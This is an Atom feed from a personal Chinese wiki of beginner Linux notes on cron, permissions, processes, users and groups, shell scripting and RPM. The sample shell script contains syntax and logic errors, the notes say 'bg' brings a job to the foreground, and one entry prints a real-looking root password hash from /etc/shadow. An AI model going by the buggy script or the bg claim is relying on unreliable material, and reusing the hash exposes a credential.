<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>daiker&#39;s wiki</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.daikersec.com/"/>
  <updated>2018-06-24T14:54:16.846Z</updated>
  <id>http://www.daikersec.com/</id>
  
  <author>
    <name>daiker</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>调度任务</title>
    <link href="http://www.daikersec.com/wiki/9b3ccf99.html"/>
    <id>http://www.daikersec.com/wiki/9b3ccf99.html</id>
    <published>2018-06-24T14:12:06.000Z</published>
    <updated>2018-06-24T14:54:16.846Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-crontab的配置"><a href="#1-crontab的配置" class="headerlink" title="1.crontab的配置"></a>1.crontab的配置</h4><p>调度任务:让计算机在指定的时间自动运行命令<br>Linux实现调度任务机制的方法是cron和at系统<br>cron是一个调度进程的系统，由一个守护进程 （crond）和用户的配置文件（crontab）构成<br>cron的常见用途是记录系统状态日志、启动备 份、轮换日志文件和开始运行系统清理脚本<br>cron可以被配置为运行或拒绝特定用户的调度事件 能力。通过/etc/cron.allow和/etc/cron.deny文件 实现。<br>cron维护着一个缓冲池（spool）目录来保持 crontab文件。通常这个目录为/var/spool/cron，每 个调度工作的用户在里面都有一个crontab文件。这 个crontab的文件名和用户名一样。如mike用户的crontab文件为/var/spool/cron/mike</p><p>接下来的是重点<br>立体<br>以下crontab事件条目分别代表什么时间执行？<br>1）30   23   *  *   *   /bin/sync<br>2） 5   */6   15   <em>   1   /bin/sync<br>3）\</em>/5   0,12   <em>   </em>   1-5   /bin/sync<br>答：<br>首先前面有五个数字，分别代表 <code>分钟 小时   日期   月   周</code>，最后一个是命令<br>然后<code>*</code>代表都可以，<code>*/5</code>代表5的倍数<br>比如第一个<br>30 23代表在23:30</p><p><code>* * *</code></p><p>代表都可以。那就是在每天的23:30执行<code>/bin/sync</code>.以此类推<br> 1）表示每天的23点30分执行<br> 2）表示每个星期一或每个月15号的0点零5分、6点零5分、 12点零5分、18点零5分执行<br>3）表示星期一到星期五的0点至1点之间每隔5分钟执行和12 点－13点之间每隔5分钟执行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-crontab的配置&quot;&gt;&lt;a href=&quot;#1-crontab的配置&quot; class=&quot;headerlink&quot; title=&quot;1.crontab的配置&quot;&gt;&lt;/a&gt;1.crontab的配置&lt;/h4&gt;&lt;p&gt;调度任务:让计算机在指定的时间自动运行命令&lt;br&gt;Linux
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>权限管理</title>
    <link href="http://www.daikersec.com/wiki/62e89ee7.html"/>
    <id>http://www.daikersec.com/wiki/62e89ee7.html</id>
    <published>2018-06-24T14:11:39.000Z</published>
    <updated>2018-06-24T14:53:48.849Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-文件和目录的访问控制"><a href="#1-文件和目录的访问控制" class="headerlink" title="1.文件和目录的访问控制"></a>1.文件和目录的访问控制</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-bb5b75f110d0d09b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>第一位属性： </p><ul><li>为 d 表示是目录； </li><li>为 - 表示是文件； </li><li>为 l  表示是连接文件； </li><li>为 b 表示是可供存储的设备； <ul><li>为 c  表示是其他外围设备，如键盘、鼠标等。 </li></ul></li></ul><p>其他9位属性称为保护标志（权限字），每3位为一组，即 对三类用户（用户、组和其他）提供保护<br>要存取一个文件或目录，对于每一个用户，都必须提供相 应的权限<br><img src="https://upload-images.jianshu.io/upload_images/5443560-7e5f38d852ef7e45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-c3ddfdd31f0010ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="2-粘滞位"><a href="#2-粘滞位" class="headerlink" title="2.粘滞位"></a>2.粘滞位</h4><p>先看这个<br><img src="https://upload-images.jianshu.io/upload_images/5443560-5c3e353b95adf162.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>对于其他用户的权限是rwt,随后是t不是x。这个就是粘滞位。其他用户对他都rw权限，正常有删除的权限，但是有了粘滞位之后。不能删除</p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-6d7956f7c7c9f1f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>当目录被设置了粘滞位权限以后，即便用户对该目录有写的权限，也不能删除该目录中其他用户的文件数据，而是只有该文件的所有者和root用户才有权将其删除。设置了粘滞位之后，正好可以保持这种动态的平衡：允许各用户在目录中任意写入、删除数据，但是禁止随意删除其他用户的数据。   </p><p>但是该目录下的目录不继承该粘滞位权限，要再设置才可使用。也只能针对目录设置，对于文件无效。则设置了粘滞位后，只有目录内文件的所有者或者root才可以删除或移动该文件。如果不为目录设置粘滞位，任何具有该目录写和执行权限的用户都可以删除和移动其中的文件。</p><p>需要注意的是：粘滞位权限只能针对目录设置，对于文件无效。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-文件和目录的访问控制&quot;&gt;&lt;a href=&quot;#1-文件和目录的访问控制&quot; class=&quot;headerlink&quot; title=&quot;1.文件和目录的访问控制&quot;&gt;&lt;/a&gt;1.文件和目录的访问控制&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://upload-image
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>进程管理</title>
    <link href="http://www.daikersec.com/wiki/852cfab6.html"/>
    <id>http://www.daikersec.com/wiki/852cfab6.html</id>
    <published>2018-06-24T14:11:26.000Z</published>
    <updated>2018-06-24T14:54:28.855Z</updated>
    
    <content type="html"><![CDATA[<p>代码段、数据段和PCB（进程控制块)<br>同一 个进程下可以拥有多个线程，它们共享这个进程的资源， 它们之间的切换也不再需要PCB，而只需要极少一点资 源就可以了。在这样的操作系统里，线程变成了系统调 度和分派的基本单位。 </p><h4 id="1-PID"><a href="#1-PID" class="headerlink" title="1. PID"></a>1. PID</h4><p> 每一个进程都有唯一的ID（PID），是在进程表中识别 进程的标识<br><img src="https://upload-images.jianshu.io/upload_images/5443560-48593238d35b39f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>第一栏就是pid</p><h4 id="2-PPID"><a href="#2-PPID" class="headerlink" title="2. PPID"></a>2. PPID</h4><p>这个进程的父进程<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a7b388db723b6485.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>父进程跟子进程:<br>Linux下，进程的创建，采用的是Fork（派生）：用一个程序创建一个新进程的方法 。比如我创建一个进程<code>ping</code>，必须通过另外的一个进程来派生，另外的进程就叫做父进程。比如<br><img src="https://upload-images.jianshu.io/upload_images/5443560-9469bc3fa851c104.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><code>ping</code>在控制台下运行，是bash派生的<br>fork-exec：先用fork生成一个子进程,然后利用 exec函数族用新进程映像取代调用进程映像。 这时候shell将等待fork-exec子进程执行完毕，并 重新显示shell提示信息。</p><h4 id="3-EUID（effective-user-id）"><a href="#3-EUID（effective-user-id）" class="headerlink" title="3. EUID（effective user id）"></a>3. EUID（effective user id）</h4><p>uid和euid（effective user id）的区别：uid就是你 login的时候使用的id，而euid则是你当前的有效id。比如在setuid的程序里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c782b1a6d353b1fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>去执行的时候会暂时性将euid变成文件所有者的sid,但是sid 没变</p><h4 id="5-监视进程"><a href="#5-监视进程" class="headerlink" title="5. 监视进程"></a>5. 监视进程</h4><p>ps 命令<br>以短横（-）开始，与System-V兼容。 n 没有短横，与BSD兼容<br> -e （-A）：显示所有进程<br> -f  ：全格式 n -H （f）：显示树状结构，表示程序间的相互关系。<br>a  ：显示现行终端机下的所有程序，包括其他用户的程序。<br>u  ：以用户为主的格式来显示程序状况。<br>x  ：显示所有程序，不以终端机来区分。<br>所以一般就<code>ps -ef</code>或者 <code>ps aux</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-99490727b440d622.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-cfac5d45c04c7462.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p><code>PID USER      PRI  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</code><br> <code>PRI</code>：进程优先权方案。较大的数表示较低的优先权<br><code>NI</code>：该进程的优先级值(niceness )<br><code>SIZE</code>：该进程的代码大小加上数据大小再加上堆栈空 间大小的总数。单位是KB<br><code>RSS</code>：进程占用的物理内存的总量<br><code>SHARE</code>：该进程使用共享内存的数量<br><code>STAT</code>：进程的状态有这几种</p><ul><li>R：是正在CPU中运行的进程，或者是准备就绪，只等 CPU空闲即可运行的进程。<ul><li>S：休眠的进程是那些等待某些事件触发以继续执行的进 程。通常它会等待某类I/O操作或某个信号。</li><li>T：已终止的进程是被用户中断的进程。</li><li>D：该进程不能被中断，因为此时内核程序正忙 于该进程的某些I/O操作<br><code>TIME</code>：该进程自启动以来所占用的总CPU时间 </li></ul></li></ul><h4 id="6-管理进程"><a href="#6-管理进程" class="headerlink" title="6. 管理进程"></a>6. 管理进程</h4><p> 内核程序利用优先级大小来判断何时及如何安排进程。<br>每个进程都有两个优先级值：静态值和动态值。<br>我们通常讨论的优先级是指静态优先级，因为我们无法 控制动态优先级。<br>优先级值的范围从-20到20（实际上为19）。大部分优 先级的值为0<br>优先级值小的进程具有更高的优先级。即减少niceness 值（优先级值）就意味着进程能获得更多的CPU时间。<br>子进程会继承父进程的优先级。<br><code>nice</code> 更改优先级(直接 – niceness )<br>nice -19 tar(19是 niceness)<br>把这个tar 命令执行后的优先级调到最低<br> <code>renice</code>改变运行中进程的优先级<br>renice 19 50<br>(19为niceness,50为pid)<br>第二个参数是niceness，第三个参数是pid</p><p>  <code>查看后台程序</code><br>jobs<br><code>将后台程序放到前台</code><br>bg %id<br><code>将进程放到后台</code></p><ul><li>刚要执行的时候直接在后面加&amp;<br>如<code>python run.pu &amp;</code></li><li>将正在执行的程序放到后台,ctrl+z,这个时候是挂起在后台的，通过<code>bg %id</code>是它在后台运行</li></ul><h4 id="7-信号发送的命令kill"><a href="#7-信号发送的命令kill" class="headerlink" title="7. 信号发送的命令kill"></a>7. 信号发送的命令kill</h4><p>kill   [option]  pid…<br> -l：列出所有可用信号名称<br>-s  signal  /  -signal ：指定发送特定的信号<br>kill  -s   9   471<br>强制杀死pid为471的进程<br>可缩写为<br>kill -9 471</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;代码段、数据段和PCB（进程控制块)&lt;br&gt;同一 个进程下可以拥有多个线程，它们共享这个进程的资源， 它们之间的切换也不再需要PCB，而只需要极少一点资 源就可以了。在这样的操作系统里，线程变成了系统调 度和分派的基本单位。 &lt;/p&gt;
&lt;h4 id=&quot;1-PID&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>用户管理</title>
    <link href="http://www.daikersec.com/wiki/500fed5c.html"/>
    <id>http://www.daikersec.com/wiki/500fed5c.html</id>
    <published>2018-06-24T14:11:09.000Z</published>
    <updated>2018-06-24T14:53:56.721Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-用户介绍"><a href="#1-用户介绍" class="headerlink" title="1. 用户介绍"></a>1. 用户介绍</h4><p>新用户在Linux系统内要有一个帐号和工作环境<br>用户的信息存储在<code>/etc/passwd</code>里面<br>以下面这条为例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">用户名:密码:uid:gid:注释信息:家目录:shell</span><br></pre></td></tr></table></figure></p><p>第一个是用户名<code>root</code>，是用户用于登录Linux系统使用的名字，该名 字在同一系统上必须唯<br>第二个 <code>x</code>是用户密码，在旧版本的系统是放在这边的，但是新版本放在<code>/etc/shadow</code>里面了。<br>第三个是0，是用户的UID<br>第四个是0，是以用户的GID<br>第五个是注释信息<br>第六个是用户的家目录<br>第七个是用户的默认<code>shell</code>。这里面需要注意是一个shell。<code>/sbin/nologin</code>这个shell 不允许用户登陆。</p><h4 id="2-新增用户"><a href="#2-新增用户" class="headerlink" title="2. 新增用户"></a>2. 新增用户</h4><p><code>useradd  [选项…]  用户名</code>(选项分别对应上面的/etc/passwd的内容)<br> -u uid  用户的UID值 。数字不可为负值。<br>-g defaultgroup 指定该用户登录使用的群组。<br>-c comment  该用户的注释说明。<br>-d home_dir  指定用户的家目录。<br>-m 用户家目录不在则自动创建。<br>-k skel_dir 指定用户模板目录，默认是/etc/skel。<br>-s shell  指定用户使用的shell。 </p><h4 id="3-用户口令"><a href="#3-用户口令" class="headerlink" title="3. 用户口令"></a>3. 用户口令</h4><ul><li><p>用户口令介绍<br>就是用户登陆所需要的密码，一般放在<code>/etc/shadow文件</code>里面<br><code>root:$6$mD3zZc/j$ttZCrtCCYIFTGIY3nsEQqTkbBw./FvWFaMK/OxteTaAR.b33J9izn7q2SvsPauDijhYLaaO.SCnr0vBDA5DYy.:17701:0:99999:7:::</code><br>其中的<code>$6$mD3zZc/j$ttZCrtCCYIFTGIY3nsEQqTkbBw./FvWFaMK/OxteTaAR.b33J9izn7q2SvsPauDijhYLaaO.SCnr0vBDA5DYy.</code>就是加密过的口令。系统会对用户输入的密码加密之后跟这个进行比较。</p></li><li><p>修改用户口令<br>passwd 用户名<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8cf067604d346196.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p></li></ul><h4 id="4-修改用户属性"><a href="#4-修改用户属性" class="headerlink" title="4. 修改用户属性"></a>4. 修改用户属性</h4><p><code>usermod   [选项…]  用户名</code><br>选项跟(useradd)的选项一样<br> -u uid  用户的UID值 。数字不可为负值。<br><code>-g defaultgroup 指定该用户登录使用的群组。</code><br>-c comment  该用户的注释说明。<br>-d home_dir  指定用户的家目录。<br>-m 用户家目录不在则自动创建。</p><h4 id="5-删除用户"><a href="#5-删除用户" class="headerlink" title="5. 删除用户"></a>5. 删除用户</h4><p><code>userdel  [-r]  用户名</code><br> 选项-r可以用于清除用户的家目录。 </p><h4 id="6-用户组介绍"><a href="#6-用户组介绍" class="headerlink" title="6.用户组介绍"></a>6.用户组介绍</h4><p>不同的用户可以在同一个组，同一个组成员可以共享一个文件的权限<br>在前面说过<code>/etc/passwd</code>里面有一个属性是gid来表示这个用户属于那个组,这个gid就是组的表示。可以通过查看<code>/etc/group</code>来查看组消息<br><code>root:x:0:root,test</code>,这里面<br>第一个是组名，<br>第二个是这个组加密过的口令，跟<code>/etc/passwd</code>一样，一般组口令不在这里面，所以他缺省为x,一般组口令在 <code>/etc/gshadow</code><br>第三个是gid<br>第四个是组成员，用<code>,</code>隔开</p><h4 id="7-增加组"><a href="#7-增加组" class="headerlink" title="7.  增加组"></a>7.  增加组</h4><p><code>groupadd  [选项]  组名</code><br> -g  gid：指定增加组的gid </p><h4 id="8-删除组"><a href="#8-删除组" class="headerlink" title="8. 删除组"></a>8. 删除组</h4><p>groupdel  组名</p><h4 id="9-修改组用户"><a href="#9-修改组用户" class="headerlink" title="9.修改组用户"></a>9.修改组用户</h4><p><code>gpasswd  [选项]  组</code><br> -a  user：添加一个用户到指定组中<br>-d  user：从指定组中删除一个用户 </p><h4 id="10-修改组的GID和组名"><a href="#10-修改组的GID和组名" class="headerlink" title="10. 修改组的GID和组名"></a>10. 修改组的GID和组名</h4><p><code>groupmod  [选项]  组名</code><br>-g gid：修改指定组的GID<br>-n  group_name：修改指定组的组名 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-用户介绍&quot;&gt;&lt;a href=&quot;#1-用户介绍&quot; class=&quot;headerlink&quot; title=&quot;1. 用户介绍&quot;&gt;&lt;/a&gt;1. 用户介绍&lt;/h4&gt;&lt;p&gt;新用户在Linux系统内要有一个帐号和工作环境&lt;br&gt;用户的信息存储在&lt;code&gt;/etc/passwd
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>shell和shell编程</title>
    <link href="http://www.daikersec.com/wiki/fb0a66e4.html"/>
    <id>http://www.daikersec.com/wiki/fb0a66e4.html</id>
    <published>2018-06-24T14:10:56.000Z</published>
    <updated>2018-06-24T14:53:32.243Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-shell变量赋值"><a href="#1-shell变量赋值" class="headerlink" title="1. shell变量赋值"></a>1. shell变量赋值</h4><ul><li>任何字符串都可以作为变量的值赋给某个变量； </li><li>如果字符串中包含空格、tab或换行符时，应该用 引号（单、双都可以）括起来。</li><li>变量的值中包含多个连续的空格在输出显示时会当 作一个空格来处理</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-4E87I7L:/tmp# a=5</span><br></pre></td></tr></table></figure><h4 id="2-变量引用"><a href="#2-变量引用" class="headerlink" title="2. 变量引用"></a>2. 变量引用</h4><p><code>$</code>+变量名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-4E87I7L:/tmp# echo $a</span><br><span class="line">5</span><br></pre></td></tr></table></figure></p><h4 id="3-系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）"><a href="#3-系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）" class="headerlink" title="3. 系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）"></a>3. 系统变量PATH、HOME、PWD、PS1、环境文件（profile和bashrc的差别）</h4><ul><li>PATH 是操作系统用于查找来自命令行或终端窗口的必需可执行文件的系统变量。<br>比如执行<code>cat 1.txt</code>。这个cat 是在<code>/usr/bin/cat</code>这个路径，但是当前可以找到它，是因为<code>PATH</code>这个变量里面有<code>/usr/bin</code>这个</li><li><p>HOME 家目录<br>正常的话,root用户的家目录在  <code>/root</code>,其他用户在<code>/home/用户名</code></p></li><li><p>PS1<br>提示符<br>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-4E87I7L:/tmp# echo $PS1</span><br><span class="line">\[\e]0;\u@\h: \w\a\]$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$</span><br></pre></td></tr></table></figure></li></ul><p>其中一些特殊字符的代码<br>\$ 显示$符作为提示符，如果用户是root的话，则 显示#号。<br>\\ 显示反斜杠。<br>\d 显示当前日期。<br>\h 显示主机名。<br>\t 显示当前时间。<br>\w 显示当前工作目录的路径。 </p><ul><li>PS2<br>PS2 变量展开的方式与 PS1 相同，其展开值用作次提示符字符串。用于提示接续你尚未完成输入的命令。默认为<code>&gt;</code><br>比如<br><img src="https://upload-images.jianshu.io/upload_images/5443560-e4162d4da46ba5f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>稍作修改。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-9f5890c8316b646a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li><li>PWD<br>当前路径,作用跟<code>pwd</code>一样</li><li>环境文件（profile和bashrc的差别）<br>profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当<code>用户登录</code>时,该文件仅仅执行一次!<br>bashrc:该文件包含专用于你的bash shell的bash信息,当<code>登录时</code>以及 <code>每次打开新的shell</code>时,该文件被读取.</li></ul><h4 id="4-shell通配符"><a href="#4-shell通配符" class="headerlink" title="4. shell通配符"></a>4. shell通配符</h4><p>用来匹配多个文件名或目录名的特殊字符叫通配 符。<br>*   匹配任意个（含0个）字符<br>?   匹配任意一个字符<br>[list] 匹配其中之一的字符<br>[!list]   匹配不在其中的字符</p><p>如<code>1*3.txt</code>匹配1223.txt<br>如<code>1?3.txt</code>匹配123.txt<br>如<code>[abcd]1.txt</code>匹配a1.txt<br>如<code>[a-d]1.txt</code>匹配a1.txt<br>如<code>[!abc]1.txt</code>匹配d1.txt</p><h4 id="5-引号"><a href="#5-引号" class="headerlink" title="5. 引号"></a>5. 引号</h4><p><img src="https://upload-images.jianshu.io/upload_images/5443560-0b00669a4de56c6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>双引号会解析</p><h4 id="6-正则表达式"><a href="#6-正则表达式" class="headerlink" title="6. 正则表达式"></a>6. 正则表达式</h4><p>跟通配符的区别<br>正则表达式和shell的特殊字符异同点<br>正则表达用点匹配任意一个字符，相当于shell的问号。<br>.*匹配零或多个字符，相当于shell的*<br> []用法和shell一样，只是用^代替了!表示不匹配<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fe35539e4f2f2d49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-c6e0242eceb1752d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-9d54af6b41fa6656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="7-输入输出命令"><a href="#7-输入输出命令" class="headerlink" title="7. 输入输出命令"></a>7. 输入输出命令</h4><p>标准输入输出<br>每一个Linux命令都有３个与之相关的输入输出流： </p><ul><li>stdin     标准输入，命令默认的输入位置 </li><li>stdout   标准输出，命令默认的输出位置 </li><li>stderr    标准错误输出，也是命令的输出位置，用于输出错误及诊断信息。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-5ea97dc03087fe69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><code>重定向</code><br>比如把应该输出到屏幕的输出到文件<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8187538ecfb73c0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li></ul><p><code>2&gt;&amp;1</code>解释<br>2 是标准错误，1是标准输出，就是把标准错误发送到标准输出。注意1要加个<code>&amp;</code>，不然就会重定向到文件1</p><p><code>cat 1.txt &gt;/dev/null</code>解析<br>这里的<code>/dev/null</code>是黑洞。把输出的重定向到黑洞。等同于不输出</p><h4 id="8-管道"><a href="#8-管道" class="headerlink" title="8. 管道"></a>8. 管道</h4><p>命令A | 命令B<br>这个就是管道，把命令A 的内容的标准输出流当成命令B的标准输入流，<img src="https://upload-images.jianshu.io/upload_images/5443560-29846072489f7b92.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>举个例子<br><img src="https://upload-images.jianshu.io/upload_images/5443560-1024f4680905f91b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>cat 1的结果<code>123</code>传递给<code>grep 2</code></p><h4 id="9-shell脚本"><a href="#9-shell脚本" class="headerlink" title="9. shell脚本"></a>9. shell脚本</h4><p>变量读取<br>判断<br>循环<br>$# 参数个数<br>$0 文件名<br>$1 第一个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">read -p &quot;please input yes or not: &quot; yn</span><br><span class="line">echo $yn</span><br><span class="line">if [ &quot;$&#123;yn&#125;&quot;==&quot;Y&quot; -o &quot;$&#123;yn&#125;&quot;==&quot;y&quot; ]; then</span><br><span class="line">echo &quot;OK, continue&quot;</span><br><span class="line">exit 0</span><br><span class="line">elif [ &quot;$&#123;yn&#125;&quot;==&quot;Y&quot; -o  &quot;$&#123;yn&#125;&quot;==&quot;y&quot; ]; then</span><br><span class="line">echo &quot;oh,NO&quot;</span><br><span class="line">exit 0</span><br><span class="line">else</span><br><span class="line">echo &quot;please input yes or not&quot;</span><br><span class="line">fi</span><br><span class="line">if [ $# == 1 ]:</span><br><span class="line">echo &quot;请添加参数&quot;</span><br><span class="line">exit 0</span><br><span class="line">fi</span><br><span class="line">echo &quot;Filename: &quot;$0</span><br><span class="line">i=0</span><br><span class="line">while [ &quot;$&#123;i&#125;&quot; != $1 ]</span><br><span class="line">do</span><br><span class="line">i=$(($i+1))</span><br><span class="line">echo $i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-shell变量赋值&quot;&gt;&lt;a href=&quot;#1-shell变量赋值&quot; class=&quot;headerlink&quot; title=&quot;1. shell变量赋值&quot;&gt;&lt;/a&gt;1. shell变量赋值&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;任何字符串都可以作为变量的值赋给某个变量； &lt;/li
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>软件管理</title>
    <link href="http://www.daikersec.com/wiki/be55afaa.html"/>
    <id>http://www.daikersec.com/wiki/be55afaa.html</id>
    <published>2018-06-24T14:10:43.000Z</published>
    <updated>2018-06-24T14:54:22.800Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-RPM的安装、卸载、升级、查询、验证"><a href="#1-RPM的安装、卸载、升级、查询、验证" class="headerlink" title="1.RPM的安装、卸载、升级、查询、验证"></a>1.RPM的安装、卸载、升级、查询、验证</h4><p>安装rpm   -i<br>如rpm -i <a href="ftp://ftp.redhat.com/pub/RPMS/zip2.2-1.i386.rpm" target="_blank" rel="noopener">ftp://ftp.redhat.com/pub/RPMS/zip2.2-1.i386.rpm</a><br>卸载 rpm -e<br>升级 rpm -U<br>查询 rpm -q<br>验证 rpm -V</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-RPM的安装、卸载、升级、查询、验证&quot;&gt;&lt;a href=&quot;#1-RPM的安装、卸载、升级、查询、验证&quot; class=&quot;headerlink&quot; title=&quot;1.RPM的安装、卸载、升级、查询、验证&quot;&gt;&lt;/a&gt;1.RPM的安装、卸载、升级、查询、验证&lt;/h4&gt;&lt;
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/Linux/"/>
    
      <category term="基础学习" scheme="http://www.daikersec.com/categories/Linux/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>GUI和文本编辑</title>
    <link href="http://www.daikersec.com/wiki/4f7c637d.html"/>
    <id>http://www.daikersec.com/wiki/4f7c637d.html</id>
    <published>2018-06-24T14:10:28.000Z</published>
    <updated>2018-06-24T14:53:19.073Z</updated>
    
